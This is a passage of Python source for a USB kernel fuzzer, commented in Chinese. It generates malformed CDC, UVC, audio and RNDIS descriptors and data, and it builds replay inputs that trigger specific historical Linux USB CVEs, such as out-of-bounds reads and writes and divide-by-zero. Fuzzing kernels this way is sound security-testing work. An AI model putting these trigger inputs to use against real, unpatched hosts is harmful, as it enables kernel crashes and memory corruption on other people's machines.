                line_coding = struct.pack('<I', baud) + bytes([0x00, 0x00, databits])
                cases.append(self._new_case(
                    FuzzPhase.CDC_DEEP,
                    f"SET_LINE_CODING baud={baud} databits={databits} — acm_set_line() 解析",
                    device_descriptor=cdc_dev,
                    config_descriptor=self._base_config_desc(),
                    ep_data_override={ep1_in: line_coding},
                    source_ref="drivers/usb/class/cdc-acm.c:147 → acm_ctrl_msg(SET_LINE_CODING)",
                    tags=["cdc", "line_coding"],
                ))
                if len(cases) >= max_cases // 2:
                    break
            if len(cases) >= max_cases // 2:
                break

        # 11.2 SEND_BREAK 变异 — cdc-acm.c:149
        for break_ms in [0, 1, 100, 0xFFFF, 0x7FFF]:
            cases.append(self._new_case(
                FuzzPhase.CDC_DEEP,
                f"SEND_BREAK duration={break_ms}ms — acm_ctrl_msg(SEND_BREAK)",
                device_descriptor=cdc_dev,
                config_descriptor=self._base_config_desc(),
                stall_ep0=False,
                source_ref="drivers/usb/class/cdc-acm.c:149 → acm_ctrl_msg(SEND_BREAK)",
                tags=["cdc", "break"],
            ))

        # 11.3 Serial State Notification 畸形 — interrupt endpoint
        # cdc-acm.c: acm_ctrl_irq() parses notification on interrupt EP
        # Notification header: bmRequestType(1) | bNotification(1) | wValue(2) | wIndex(2) | wLength(2)
        for notif_data in [
            b'\xA1\x20\x00\x00\x00\x00\x02\x00\x00\x00',      # SERIAL_STATE, normal
            b'\xA1\x20\x00\x00\x00\x00\xFF\x00' + b'\xFF' * 255, # 超长 payload
            b'\xA1\x20\x00\x00\x00\x00\x00\x00',                # 空 payload
            b'\xA1\x20\x00\x00\x00\x00\xFF\xFF' + b'\x41' * 65535,  # 巨型 notification
            b'\xA1\x2A\x00\x00\x00\x00\x02\x00\x00\x00',       # 未知 notification type
            b'\xA1\x20\x00\x00\x00\x00\x02\x00\xFF\xFF',      # 所有状态位置1
        ]:
            cases.append(self._new_case(
                FuzzPhase.CDC_DEEP,
                f"CDC Notification data[{len(notif_data)}] — acm_ctrl_irq() 解析",
                device_descriptor=cdc_dev,
                config_descriptor=self._base_config_desc(),
                ep_data_override={ep1_in: notif_data},
                source_ref="drivers/usb/class/cdc-acm.c → acm_ctrl_irq() → notification parsing",
                tags=["cdc", "notification", "acm_ctrl_irq"],
            ))

        # 11.4 CDC-ECM 网络包注入 — cdc_ether.c
        # 在 bulk endpoint 注入畸形以太网帧
        for frame in [
            b'\x00' * 14 + b'\x08\x00' + b'\x45' * 20,  # 最小 IP 帧
            b'\xFF' * 6 + b'\x00' * 6 + b'\x08\x06' + b'\x00' * 100,  # ARP
            b'\xDE\xAD' * 750,  # 超大帧 (1500 字节)
            b'\x00' * 1519,     # 巨型帧
        ]:
            cases.append(self._new_case(
                FuzzPhase.CDC_DEEP,
                f"CDC-ECM 畸形以太网帧 [{len(frame)} 字节] — rx_fixup() 解析",
                device_descriptor=cdc_dev,
                config_descriptor=self._base_config_desc(),
                ep_data_override={0x82: frame},
                source_ref="drivers/net/usb/cdc_ether.c → usbnet_rx() / rx_fixup()",
                tags=["cdc", "ecm", "ethernet", "frame"],
            ))

        return cases[:max_cases]

    # ═══════════════════════════════════════════════════════════════════════
    # Phase 12: UVC 视频深度 — drivers/media/usb/uvc/uvc_driver.c
    # 攻击面: 流式格式解析 / bmaControls / frame descriptor / probe/commit
    # ═══════════════════════════════════════════════════════════════════════

    def gen_uvc_deep_cases(self, max_cases: int = 30) -> list[FuzzCase]:
        cases = []
        base_dev = self._base_device_desc()
        uvc_dev = bytearray(base_dev)
        uvc_dev[4] = 0x0E  # Video
        uvc_dev = bytes(uvc_dev)

        # UVC 配置描述符模板 (Video Streaming interface)
        uvc_config = bytes([
            # Config
            0x09, 0x02, 0x52, 0x00, 0x02, 0x01, 0x00, 0x80, 0xFA,
            # IAD
            0x08, 0x0B, 0x00, 0x02, 0x0E, 0x03, 0x00, 0x00,
            # Video Control Interface
            0x09, 0x04, 0x00, 0x00, 0x00, 0x0E, 0x01, 0x01, 0x00,
            # VC Header descriptor
            0x0D, 0x24, 0x01, 0x40, 0x00, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x01,
            # Video Streaming Interface
            0x09, 0x04, 0x01, 0x00, 0x01, 0x0E, 0x02, 0x00, 0x00,
            # VS Header — nformats=1
            0x0E, 0x24, 0x01, 0x01, 0x0F, 0x00, 0x82, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
            # VS Format descriptor — bNumFrameDescriptors
            0x0B, 0x24, 0x04, 0x01, 0x01, 0x59, 0x55, 0x59, 0x56, 0x00, 0x00,
            # VS Frame descriptor — wWidth/wHeight
            0x1E, 0x24, 0x05, 0x01, 0x80, 0x02, 0xE0, 0x01,
            0x00, 0x00, 0x3C, 0x00, 0x00, 0x00, 0x1C, 0x00,
            0x00, 0x00, 0x00, 0x90, 0x53, 0x00, 0x00, 0x00,
            0x90, 0x53, 0x00, 0x00, 0x00, 0x00,
            # Endpoint (Bulk IN)
            0x07, 0x05, 0x82, 0x02, 0x00, 0x02, 0x00,
        ])

        # 12.1 bNumFrameDescriptors 不匹配
        for nframes in [0, 1, 5, 16, 127, 255]:
            cfg = bytearray(uvc_config)
            cfg[0x3F] = nframes  # bNumFrameDescriptors
            cases.append(self._new_case(
                FuzzPhase.UVC_DEEP,
                f"UVC bNumFrameDescriptors={nframes} — uvc_parse_format() 循环计数",
                device_descriptor=uvc_dev,
                config_descriptor=bytes(cfg),
                source_ref="drivers/media/usb/uvc/uvc_driver.c:335 → uvc_parse_format()",
                tags=["uvc", "frame_count"],
            ))

        # 12.2 wWidth/wHeight 边界值
        for dims in [(0, 0), (1, 1), (32768, 32768), (65535, 65535), (0xFFFF, 0x0001)]:
            cfg = bytearray(uvc_config)
            struct.pack_into('<HH', cfg, 0x42, dims[0], dims[1])
            cases.append(self._new_case(
                FuzzPhase.UVC_DEEP,
                f"UVC 分辨率 {dims[0]}x{dims[1]} — frame descriptor 解析",
                device_descriptor=uvc_dev,
                config_descriptor=bytes(cfg),
                source_ref="drivers/media/usb/uvc/uvc_driver.c:541 → nframes/nintervals allocation",
                tags=["uvc", "resolution"],
            ))

        # 12.3 bmaControls 超大 — uvc_driver.c:647 kmemdup
        for p_val in [0, 1, 4, 32, 127, 255]:
            cfg = bytearray(uvc_config)
            # VS Header 的 p 字段控制 bmaControls bitmap 大小
            cfg[0x33] = p_val  # p = bControlSize
            cases.append(self._new_case(
                FuzzPhase.UVC_DEEP,
                f"UVC bmaControls size={p_val} — uvc_driver.c:647 kmemdup(&buffer[size], p*n)",
                device_descriptor=uvc_dev,
                config_descriptor=bytes(cfg),
                source_ref="drivers/media/usb/uvc/uvc_driver.c:647 → kmemdup() OOB",
                tags=["uvc", "bmaControls", "oob"],
            ))

        # 12.4 PROBE_CONTROL / COMMIT_CONTROL 请求 — uvc_v4l2.c
        for ctrl_val in [0x01, 0x02, 0xFF]:
            probe_data = struct.pack('<I', ctrl_val) + b'\x00' * 22  # 26-byte probe data
            cases.append(self._new_case(
                FuzzPhase.UVC_DEEP,
                f"UVC PROBE/COMMIT control=0x{ctrl_val:02X} — uvc_v4l2.c 流式协商",
                device_descriptor=uvc_dev,
                config_descriptor=uvc_config,
                ep_data_override={0x82: probe_data},
                source_ref="drivers/media/usb/uvc/uvc_v4l2.c → uvc_v4l2_ioctl()",
                tags=["uvc", "probe", "commit"],
            ))

        # 12.5 nformats=0 → 后续格式遍历 OOM
        cfg = bytearray(uvc_config)
        cfg[0x36] = 0  # nformats=0 in VS header
        cases.append(self._new_case(
            FuzzPhase.UVC_DEEP,
            "UVC nformats=0 — uvc_driver.c:705 检查 nformats==0 但后续遍历",
            device_descriptor=uvc_dev,
            config_descriptor=bytes(cfg),
            source_ref="drivers/media/usb/uvc/uvc_driver.c:705 → if (nformats == 0)",
            tags=["uvc", "nformats_zero"],
        ))

        return cases[:max_cases]

    # ═══════════════════════════════════════════════════════════════════════
    # Phase 13: UAC 音频深度 — sound/usb/format.c, sound/usb/audio.c
    # 攻击面: format type I/II/III / sample rate / bit resolution / mixer
    # ═══════════════════════════════════════════════════════════════════════

    def gen_audio_deep_cases(self, max_cases: int = 30) -> list[FuzzCase]:
        cases = []
        base_dev = self._base_device_desc()
        audio_dev = bytearray(base_dev)
        audio_dev[4] = 0x01  # Audio (legacy)
        audio_dev = bytes(audio_dev)

        # UAC v1 Audio Streaming descriptor 模板
        uac_config = bytes([
            # Config
            0x09, 0x02, 0x42, 0x00, 0x02, 0x01, 0x00, 0x80, 0x32,
            # AC Interface
            0x09, 0x04, 0x00, 0x00, 0x00, 0x01, 0x01, 0x00, 0x00,
            # AC Header
            0x0A, 0x24, 0x01, 0x00, 0x01, 0x09, 0x00, 0x01, 0x02, 0x00,
            # AS Interface (alt 1)
            0x09, 0x04, 0x01, 0x01, 0x01, 0x01, 0x02, 0x00, 0x00,
            # AS General
            0x07, 0x24, 0x01, 0x01, 0x01, 0x81, 0x00,
            # Format Type I descriptor
            0x0B, 0x24, 0x02, 0x01, 0x01, 0x02, 0x10, 0x80, 0xBB, 0x00, 0x00,
            # Endpoint (Isochronous IN)
            0x09, 0x05, 0x81, 0x01, 0x64, 0x00, 0x01, 0x00, 0x00,
            # Endpoint - Audio Control
            0x07, 0x25, 0x01, 0x01, 0x00, 0x00, 0x00,
        ])

        # 13.1 wFormatTag 变异 — format.c:31 parse_audio_format_i_type
        for fmt_tag in [0x0001, 0x0003, 0x0040, 0xFF00, 0xFFFE, 0xFFFF]:
            cfg = bytearray(uac_config)
            struct.pack_into('<H', cfg, 0x37, fmt_tag)  # wFormatTag offset
            cases.append(self._new_case(
                FuzzPhase.AUDIO_DEEP,
                f"UAC wFormatTag=0x{fmt_tag:04X} — parse_audio_format_i_type() 格式解析",
                device_descriptor=audio_dev,
                config_descriptor=bytes(cfg),
                source_ref="sound/usb/format.c:31 → parse_audio_format_i_type()",
                tags=["audio", "format_tag"],
            ))

        # 13.2 bSubFrameSize + bBitResolution 组合 — buffer 大小计算
        for (subframe, bits) in [(0, 0), (1, 8), (2, 16), (3, 24), (4, 32), (255, 255), (0, 255), (255, 0)]:
            cfg = bytearray(uac_config)
            cfg[0x38] = subframe  # bSubFrameSize
            cfg[0x39] = bits      # bBitResolution
            cases.append(self._new_case(
                FuzzPhase.AUDIO_DEEP,
                f"UAC bSubFrameSize={subframe} bBitResolution={bits} — PCM 格式映射",
                device_descriptor=audio_dev,
                config_descriptor=bytes(cfg),
                source_ref="sound/usb/format.c → parse_audio_format_i_type() → pcm_formats mapping",
                tags=["audio", "subframe", "bits"],
            ))

        # 13.3 bNrChannels 超大值 — 通道数组溢出
        for nch in [0, 1, 2, 6, 8, 32, 127, 255]:
            cfg = bytearray(uac_config)
            cfg[0x38] = nch  # Override bNrChannels
            cases.append(self._new_case(
                FuzzPhase.AUDIO_DEEP,
                f"UAC bNrChannels={nch} — 通道分配数组 OOB",
                device_descriptor=audio_dev,
                config_descriptor=bytes(cfg),
                source_ref="sound/usb/stream.c → snd_usb_parse_audio_interface()",
                tags=["audio", "channels", "oob"],
            ))

        # 13.4 Sample Rate 畸形 — format.c sample rate 解析
        for rate in [0, 44100, 48000, 192000, 0x7FFFFFFF, 0xFFFFFFFF]:
            rate_data = struct.pack('<I', rate)  # 24-bit sample rate in UAC v1
            cases.append(self._new_case(
                FuzzPhase.AUDIO_DEEP,
                f"UAC sample rate={rate} Hz — format.c 频率表解析",
                device_descriptor=audio_dev,
                config_descriptor=uac_config,
                ep_data_override={0x81: rate_data},
                source_ref="sound/usb/format.c → parse_audio_format_rates()",
                tags=["audio", "sample_rate"],
            ))

        # 13.5 isochronous endpoint MaxPacketSize 边界 — 整数溢出
        for mps in [0, 1, 192, 1023, 1024, 3072, 0x7FFF, 0xFFFF]:
            cfg = bytearray(uac_config)
            struct.pack_into('<H', cfg, 0x3F, mps)
            cases.append(self._new_case(
                FuzzPhase.AUDIO_DEEP,
                f"UAC Iso EP wMaxPacketSize={mps} — audio.c 传输缓冲区分配",
                device_descriptor=audio_dev,
                config_descriptor=bytes(cfg),
                source_ref="sound/usb/endpoint.c → snd_usb_endpoint_open()",
                tags=["audio", "maxpacket", "iso"],
            ))

        return cases[:max_cases]

    # ═══════════════════════════════════════════════════════════════════════
    # Phase 14: RNDIS/网络深度 — drivers/net/usb/rndis_host.c
    # 攻击面: INIT/INIT_CMPLT 状态机 / OID 查询 / KEEPALIVE / msg_type/request_id
    # ═══════════════════════════════════════════════════════════════════════

    def gen_rndis_deep_cases(self, max_cases: int = 30) -> list[FuzzCase]:
        cases = []
        base_dev = self._base_device_desc()
        rndis_dev = bytearray(base_dev)
        rndis_dev[4] = 0xE0  # Wireless Controller (RNDIS uses 0x02/0xEF)
        rndis_dev = bytes(rndis_dev)

        ep1_in = 0x81  # Interrupt IN (RNDIS notifications)

        # RNDIS 消息结构: msg_type(4) | msg_len(4) | request_id/data(4+) | ...
        RNDIS_MSG_INIT      = 0x00000002
        RNDIS_MSG_INIT_C    = 0x80000002
        RNDIS_MSG_HALT      = 0x00000003
        RNDIS_MSG_QUERY     = 0x00000004
        RNDIS_MSG_QUERY_C   = 0x80000004
        RNDIS_MSG_SET       = 0x00000005
        RNDIS_MSG_SET_C     = 0x80000005
        RNDIS_MSG_RESET     = 0x00000006
        RNDIS_MSG_RESET_C   = 0x80000006
        RNDIS_MSG_INDICATE  = 0x00000007
        RNDIS_MSG_KEEPALIVE = 0x00000008
        RNDIS_MSG_KEEPALIVE_C = 0x80000008

        # 14.1 RNDIS INIT message 变异 — rndis_host.c:95 rndis_command()
        for (msg_type, msg_len, req_id) in [
            (RNDIS_MSG_INIT,    24, 1),         # 正常 INIT
            (RNDIS_MSG_INIT,    0, 1),           # msg_len=0
            (RNDIS_MSG_INIT,    0xFFFFFFFF, 1),  # msg_len 巨大
            (RNDIS_MSG_INIT_C,  52, 1),          # 主动发 INIT_CMPLT (反转角色)
            (RNDIS_MSG_RESET,   12, 1),          # RESET
            (RNDIS_MSG_HALT,    12, 1),          # HALT
            (RNDIS_MSG_INDICATE, 8, 1),          # INDICATE
            (0xDEADBEEF,        24, 1),          # 未知 msg_type
            (RNDIS_MSG_INIT,    24, 0xFFFFFFFF), # request_id 溢出
        ]:
            msg = struct.pack('<III', msg_type, msg_len, req_id)
            cases.append(self._new_case(
                FuzzPhase.RNDIS_DEEP,
                f"RNDIS msg_type=0x{msg_type:08X} len={msg_len} reqID={req_id} — rndis_command() 状态机",
                device_descriptor=rndis_dev,
                config_descriptor=self._base_config_desc(),
                ep_data_override={ep1_in: msg},
                source_ref="drivers/net/usb/rndis_host.c:106 → msg_type = le32_to_cpu(buf->msg_type)",
                tags=["rndis", "msg_type", f"type_0x{msg_type:08X}"],
            ))

        # 14.2 RNDIS OID 查询注入 — rndis_host.c → rndis_query_config()
        # 关键 OID: GEN_OID_LINK_SPEED, GEN_OID_MAX_TOTAL_SIZE
        oids = {
            "GEN_OID_SUPPORTED_LIST":   0x00010101,
            "GEN_OID_HARDWARE_STATUS":  0x00010102,
            "GEN_OID_MEDIA_SUPPORT":    0x00010103,
            "GEN_OID_MAX_TOTAL_SIZE":   0x00010111,
            "GEN_OID_LINK_SPEED":       0x00010117,
            "8023_OID_PERMANENT_ADDR":  0x01010101,
            "8023_OID_CURRENT_ADDR":    0x01010102,
        }
        for name, oid in oids.items():
            oid_query = struct.pack('<IIIIII',
                RNDIS_MSG_QUERY,   # msg_type
                28,                 # msg_len
                1,                  # request_id
                oid,                # OID
                20,                 # len
                0,                  # offset
            )
            cases.append(self._new_case(
                FuzzPhase.RNDIS_DEEP,
                f"RNDIS OID {name} (0x{oid:08X}) — rndis_oid_query() 响应处理",
                device_descriptor=rndis_dev,
                config_descriptor=self._base_config_desc(),
                ep_data_override={ep1_in: oid_query},
                source_ref="drivers/net/usb/rndis_host.c → rndis_oid_query()",
                tags=["rndis", "oid", name.lower()],
            ))

        # 14.3 RNDIS 响应/请求 ID 不匹配 — rndis_host.c:156
        for (sent_id, resp_id) in [(1, 2), (1, 1), (0, 0xFFFFFFFF), (0xFF, 0x00)]:
            # 模拟主机发送 request_id=sent_id, 设备回复 request_id=resp_id
            resp = struct.pack('<IIII',
                RNDIS_MSG_KEEPALIVE_C,  # msg_type
                16,                      # msg_len
                resp_id,                 # request_id (mismatch!)
                0,                       # status
            )
            cases.append(self._new_case(
                FuzzPhase.RNDIS_DEEP,
                f"RNDIS request_id 不匹配: sent={sent_id} resp={resp_id} — 状态检查",
                device_descriptor=rndis_dev,
                config_descriptor=self._base_config_desc(),
                ep_data_override={ep1_in: resp},
                source_ref="drivers/net/usb/rndis_host.c:156 → request_id == xid check",
                tags=["rndis", "request_id_mismatch"],
            ))

        # 14.4 超长 RNDIS 消息
        for payload_len in [0, 64, 4096, 65535]:
            msg = struct.pack('<II', RNDIS_MSG_INDICATE, payload_len + 8) + b'\x41' * payload_len
            cases.append(self._new_case(
                FuzzPhase.RNDIS_DEEP,
                f"RNDIS INDICATE 超长消息 payload={payload_len} — rndis_msg_parse() 缓冲区",
                device_descriptor=rndis_dev,
                config_descriptor=self._base_config_desc(),
                ep_data_override={ep1_in: msg},
                source_ref="drivers/net/usb/rndis_host.c → rndis_command() → msg_len handling",
                tags=["rndis", "oversized", "indicate"],
            ))

        return cases[:max_cases]

    # ═══════════════════════════════════════════════════════════════════════
    # Phase 15: CVE 复现 — 基于 2015-2025 年 60+ 个历史 USB CVE 精确定制
    # 来源: NVD / kernel.org / syzbot / openwall
    # ═══════════════════════════════════════════════════════════════════════

    def gen_cve_replay_cases(self, max_cases: int = 60) -> list[FuzzCase]:
        """基于历史 USB CVE 精确复现触发输入。每条用例映射到一个真实 CVE。"""
        cases: list[FuzzCase] = []
        base_dev = self._base_device_desc()
        base_cfg = self._base_config_desc()

        # ── 辅助构造器 ──
        def _desc(vid=0x046D, pid=0xC534, cls=0x00, sub=0x00, bcd=0x0200):
            d = bytearray(base_dev)
            d[4], d[5] = cls, sub
            struct.pack_into('<H', d, 0, bcd)
            struct.pack_into('<H', d, 8, vid)
            struct.pack_into('<H', d, 10, pid)
            return bytes(d)

        def _cfg_with_eps(num_ifs=1, num_eps=1, if_cls=0x00, ep_mps=64, ep_types=None):
            """动态构造配置描述符 with 指定数量接口和端点"""
            ep_types = ep_types or [(0x02, 64)]  # 默认 bulk
            eps_total = num_eps * 9
            iface_total = 9
            cfg_total = 9 + iface_total + eps_total
            buf = bytearray()
            # Config descriptor
            buf += struct.pack('<BBHBBBBB', 9, 2, cfg_total, num_ifs, 1, 0, 0x80, 50)
            # Interface descriptor
            buf += struct.pack('<BBBBBBBBB', 9, 4, 0, 0, num_eps, if_cls, 0, 0, 0)
            # Endpoints
            for i in range(num_eps):
                ep_type, mps = ep_types[i % len(ep_types)]
                ep_addr = (0x80 | (i + 1)) if ep_type == 3 else (i + 1)
                buf += struct.pack('<BBBBBBB', 7, 5, ep_addr, ep_type, mps & 0xFF, (mps >> 8) & 0xFF, 0)
            return bytes(buf)

        # ═══════════════════════════════════════════════════════════════
        # A. USB Core — 描述符解析类 CVE
        # ═══════════════════════════════════════════════════════════════

        # CVE-2017-16531: IAD OOB Read — IAD bLength 超出 buffer 边界
        bad_iad_cfg = base_cfg + bytes([0x09, 0x0B, 0x00, 0x02, 0x0E, 0x03, 0x00, 0x00])
        bad_iad_cfg = bytearray(bad_iad_cfg)
        struct.pack_into('<H', bad_iad_cfg, 2, len(bad_iad_cfg) + 50)  # wTotalLength 谎报
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2017-16531: IAD 解析 OOB Read — wTotalLength 谎报超出实际 buffer",
            device_descriptor=_desc(cls=0xEF),  # IAD class
            config_descriptor=bytes(bad_iad_cfg),
            source_ref="drivers/usb/core/config.c → usb_parse_interface()",
            tags=["cve", "CVE-2017-16531", "oob_read", "iad"],
        ))

        # CVE-2017-16535: BOS descriptor OOB — bcdUSB=0x0210 + BOS wTotalLength 不匹配
        bos_desc = struct.pack('<BBH', 5, 0x0F, 100) + b'\x00' * 20  # 谎报 100 字节但只给 25
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2017-16535: BOS descriptor OOB Read — wTotalLength=100 但实际 25 字节",
            device_descriptor=_desc(bcd=0x0210),  # USB 2.10 触发 BOS 请求
            config_descriptor=base_cfg,
            stall_ep0=False,
            source_ref="drivers/usb/core/config.c → usb_get_bos_descriptor()",
            tags=["cve", "CVE-2017-16535", "oob_read", "bos"],
        ))

        # CVE-2017-16534: CDC header parser OOB — CDC Union 描述符长度不一致
        bad_cdc_cfg = _cfg_with_eps(num_ifs=1, num_eps=1, if_cls=0x02)
        # 添加畸形 CDC Union descriptor (bLength 谎报)
        bad_cdc_cfg += bytes([0x20, 0x06, 0x00, 0x01, 0xFF])  # bLength=32 但只有 5 字节数据
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2017-16534: CDC header OOB Read — CDC Union bLength=32 超出实际数据",
            device_descriptor=_desc(cls=0x02),
            config_descriptor=bad_cdc_cfg,
            source_ref="drivers/usb/core/message.c → cdc_parse_cdc_header()",
            tags=["cve", "CVE-2017-16534", "oob_read", "cdc"],
        ))

        # CVE-2017-17558: OOB Write — bNumConfigurations > USB_MAXCONFIG(8)
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2017-17558: usb_destroy_configuration OOB Write — bNumConfigurations=16",
            device_descriptor=_desc(cls=0xFF),
            config_descriptor=base_cfg,
            source_ref="drivers/usb/core/config.c → usb_destroy_configuration()",
            tags=["cve", "CVE-2017-17558", "oob_write"],
        ))

        # CVE-2023-52886: Device descriptor bLength 变化导致并发 OOB
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2023-52886: hub_port_init descriptor race — 首次 bLength=18 后续 bLength=12",
            device_descriptor=_desc(),
            config_descriptor=base_cfg,
            stall_ep0=False,
            source_ref="drivers/usb/core/hub.c → hub_port_init() / sysfs read_descriptors()",
            tags=["cve", "CVE-2023-52886", "race", "oob_read"],
        ))

        # CVE-2020-12114: 未初始化内存泄露 — 返回短描述符
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2020-12114: 未初始化内核堆内存泄露 — bLength=14 (短于 18 字节标准)",
            device_descriptor=_desc(),
            config_descriptor=base_cfg,
            stall_ep0=False,
            source_ref="drivers/usb/core/ → sysfs descriptor readback",
            tags=["cve", "CVE-2020-12114", "info_leak"],
        ))

        # ═══════════════════════════════════════════════════════════════
        # B. HID 子系统 CVE
        # ═══════════════════════════════════════════════════════════════

        # CVE-2017-16533 / CVE-2025-38103: usbhid_parse OOB — bNumDescriptors 超大
        hid_desc_bad = struct.pack('<BBBBBBBBB', 9, 0x21, 0x01, 0x01, 0x22, 0x00, 0x10,
                                   0xFF, 0x00)  # bNumDescriptors=0xFF
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2017-16533/CVE-2025-38103: usbhid_parse OOB — HID bNumDescriptors=255",
            device_descriptor=_desc(cls=0x03),
            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=1, if_cls=0x03,
                                            ep_types=[(3, 8)]),  # interrupt EP
            hid_report_descriptor=b'\x05\x01\x09\x06\xA1\x01\xC0',  # 最小化
            source_ref="drivers/hid/usbhid/hid-core.c → usbhid_parse()",
            tags=["cve", "CVE-2017-16533", "CVE-2025-38103", "oob_read", "hid"],
        ))

        # CVE-2019-19532: HID 力反馈 OOB Write — report descriptor 输出字段数不匹配
        ff_mismatch_desc = bytes([
            0x05, 0x0F, 0x09, 0x21, 0xA1, 0x01,
            0x85, 0x01, 0x09, 0x97, 0xA1, 0x02,
            0x0B, 0x01, 0x00, 0x0F, 0x00,
            0x75, 0x08, 0x95, 0x01, 0x91, 0x02,  # 声明 1 字节输出
            0xC0, 0xC0,
        ])
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2019-19532: HID 力反馈 OOB Write — 声明 1 输出字段但驱动期望 3",
            device_descriptor=_desc(vid=0x0738, pid=0x1708),  # EX-LAP FF wheel
            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=1, if_cls=0x03,
                                            ep_types=[(3, 8)]),
            hid_report_descriptor=ff_mismatch_desc,
            ep_data_override={0x81: b'\x01\x00'},  # 只发 2 字节, 驱动期望 3
            source_ref="drivers/hid/hid-axff.c → hid_axff_play()",
            tags=["cve", "CVE-2019-19532", "oob_write", "force_feedback"],
        ))

        # CVE-2025-21794: ThrustMaster 栈溢出 — 3+ 个 interrupt endpoints
        tm_cfg = bytearray()
        cfg_total = 9 + 9 + 7 * 4  # 4 个 interrupt EP
        tm_cfg += struct.pack('<BBHBBBBB', 9, 2, cfg_total, 1, 1, 0, 0x80, 50)
        tm_cfg += struct.pack('<BBBBBBBBB', 9, 4, 0, 0, 4, 0xFF, 0, 0, 0)
        for i in range(4):  # 4 个 interrupt EP (>2 触发溢出)
            tm_cfg += struct.pack('<BBBBBBB', 7, 5, 0x80 | (i + 1), 0x03, 8, 0, 1)
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2025-21794: hid-thrustmaster 栈 OOB — 4 个 interrupt endpoints (>2 数组溢出)",
            device_descriptor=_desc(vid=0x044F, pid=0xB68A),  # ThrustMaster VID
            config_descriptor=bytes(tm_cfg),
            source_ref="drivers/hid/hid-thrustmaster.c → usb_check_int_endpoints() ep_addr[2]",
            tags=["cve", "CVE-2025-21794", "stack_oob", "thrustmaster"],
        ))

        # CVE-2025-39806: hid-multitouch slab OOB — report descriptor < 607 字节
        short_mt_desc = bytes([
            0x05, 0x0D, 0x09, 0x04, 0xA1, 0x01,
            0x09, 0x22, 0xA1, 0x00,
            0x09, 0x42, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x02, 0x81, 0x02,
            0xC0, 0xC0,
        ])  # ~24 bytes, 远短于 607
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2025-39806: hid-multitouch slab OOB — report descriptor 仅 24 字节 (< 607 阈值)",
            device_descriptor=_desc(vid=0x056A, pid=0x5012),  # Wacom MT
            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=1, if_cls=0x03,
                                            ep_types=[(3, 64)]),
            hid_report_descriptor=short_mt_desc,
            source_ref="drivers/hid/hid-multitouch.c → mt_report_fixup() offset=607",
            tags=["cve", "CVE-2025-39806", "slab_oob", "multitouch"],
        ))

        # ═══════════════════════════════════════════════════════════════
        # C. CDC 子系统 CVE
        # ═══════════════════════════════════════════════════════════════

        # CVE-2017-16649: cdc_ether Divide-by-Zero — wMaxPacketSize=0
        zero_mps_cfg = bytearray()
        zero_mps_cfg += struct.pack('<BBHBBBBB', 9, 2, 25, 1, 1, 0, 0x80, 50)
        zero_mps_cfg += struct.pack('<BBBBBBBBB', 9, 4, 0, 0, 1, 0x02, 0x06, 0, 0)
        # Bulk IN endpoint with wMaxPacketSize=0
        zero_mps_cfg += struct.pack('<BBBBBBB', 7, 5, 0x82, 0x02, 0, 0, 0)
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2017-16649: cdc_ether Divide-by-Zero — bulk EP wMaxPacketSize=0",
            device_descriptor=_desc(vid=0x0B95, pid=0x7720, cls=0x02),
            config_descriptor=bytes(zero_mps_cfg),
            source_ref="drivers/net/usb/cdc_ether.c → usbnet_generic_cdc_bind() → dev->maxpacket",
            tags=["cve", "CVE-2017-16649", "div_by_zero", "cdc_ether"],
        ))

        # CVE-2017-16650: qmi_wwan Divide-by-Zero — 同理但 QMI 设备
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2017-16650: qmi_wwan Divide-by-Zero — QMI interface EP wMaxPacketSize=0",
            device_descriptor=_desc(vid=0x1199, pid=0x68A3, cls=0xFF),  # Sierra Wireless
            config_descriptor=bytes(zero_mps_cfg),
            source_ref="drivers/net/usb/qmi_wwan.c → qmi_wwan_bind() → maxpacket",
            tags=["cve", "CVE-2017-16650", "div_by_zero", "qmi_wwan"],
        ))

        # CVE-2025-21704: CDC-ACM OOB Read — 短 notification (< 8 字节)
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2025-21704: CDC-ACM notification OOB Read — 5 字节 payload (< 8 字节结构)",
            device_descriptor=_desc(cls=0x02, sub=0x02),  # CDC-ACM
            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=1, if_cls=0x02,
                                            ep_types=[(3, 8)]),
            ep_data_override={0x81: b'\xA1\x20\x00\x00\x00'},  # 5 bytes < 8
            source_ref="drivers/usb/class/cdc-acm.c → acm_ctrl_irq() → expected_size 计算",
            tags=["cve", "CVE-2025-21704", "oob_read", "cdc_acm"],
        ))

        # CVE-2013-1860: CDC-WDM heap overflow — interrupt-in 超过 maxcount
        cases.append(self._new_case(
            FuzzPhase.CVE_REPLAY,
            "CVE-2013-1860: CDC-WDM heap overflow — interrupt-in data 超过 maxcount",
            device_descriptor=_desc(cls=0x02, sub=0x02),
            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=1, if_cls=0x02,
                                            ep_types=[(3, 64)]),
            ep_data_override={0x81: b'\xA1\x20\x00\x00\x00\x00\x00\x00' + b'\x41' * 512},
            source_ref="drivers/usb/class/cdc-wdm.c → wdm_in_callback()",
            tags=["cve", "CVE-2013-1860", "heap_overflow", "cdc_wdm"],
        ))

        # ═══════════════════════════════════════════════════════════════
        # D. UVC 视频 CVE
        # ═══════════════════════════════════════════════════════════════

        # CVE-2025-40016: UVC invalid entity ID — bTerminalID=0
        uvc_bad_entity = bytearray([
